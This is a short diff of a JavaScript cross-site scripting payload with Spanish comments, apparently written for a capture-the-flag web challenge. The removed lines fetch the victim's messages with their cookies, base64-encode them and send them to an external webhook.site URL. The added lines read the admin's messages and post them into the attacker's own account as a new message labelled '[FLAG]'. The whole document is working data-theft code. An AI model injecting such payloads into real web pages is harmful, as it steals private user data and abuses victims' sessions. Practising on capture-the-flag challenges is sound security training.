@@ -1,11 +1,24 @@
-(async function(){
+(async () => {
   try {
-    const r = await fetch('/messages', { credentials: 'include' });
-    const d = await r.json();
+    // Pedimos los mensajes del admin (id=1)
+    const r = await fetch('/messages?id=1');
+    const data = await r.json();
 
-    const encoded = btoa(JSON.stringify(d));
-    location.href = 'https://webhook.site/376da9f2-490d-4e83-85f5-c6ca830535d8/?d=' + encodeURIComponent(encoded);
+    // Extraemos todos los mensajes como texto
+    const flag = data.messages.map(m => m.message).join('\n');
+
+    // Enviamos la flag de vuelta a nuestra cuenta como nuevo mensaje
+    await fetch('/create_msg', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ message: '[FLAG]\n' + flag })
+    });
   } catch (e) {
-    location.href = 'https://webhook.site/376da9f2-490d-4e83-85f5-c6ca830535d8/?err=' + encodeURIComponent(String(e));
+    // Si algo falla, que también lo deje anotado
+    await fetch('/create_msg', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ message: 'Error: ' + e })
+    });
   }
 })();
